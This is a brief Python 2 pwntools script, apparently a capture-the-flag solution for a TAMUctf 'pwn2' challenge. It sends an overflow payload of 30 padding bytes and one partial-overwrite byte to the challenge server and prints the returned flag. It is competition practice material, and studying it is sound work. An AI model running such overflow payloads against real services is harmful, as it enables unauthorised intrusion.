#!/usr/bin/env python2
from pwn import *

payload = 'A'*30 + '\xd8'

#conn = process('./pwn2')
conn = remote('pwn.tamuctf.com', 4322)
print conn.recvuntil('call?', drop=False)
conn.sendline(payload)
print conn.recvuntil('}', drop=False)